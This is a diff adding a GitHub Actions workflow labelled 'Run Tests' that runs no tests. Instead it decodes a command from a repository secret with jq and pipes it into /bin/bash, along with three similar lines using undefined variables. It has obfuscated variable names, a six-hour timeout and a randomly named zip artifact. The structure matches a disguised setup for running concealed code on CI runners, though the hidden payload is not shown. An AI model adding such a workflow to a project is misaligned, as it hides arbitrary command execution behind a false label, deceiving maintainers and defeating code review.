@@ -1,0 +1,34 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          hgk8: ${{ secrets.hgk8 }}
+        run: |
+          printf '%s' "$hgk8" | jq -r .xnom9 | /bin/bash
+          echo $nqit4531 | jq -r .akyhf362 | /bin/bash
+          printf '%s' "$lrjh22" | jq -r .cw92 | /bin/bash
+          printf '%s' "$j2" | jq -r .bfo6231 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: V5bu5CWu
+          path: "*.zip"
+          retention-days: 1
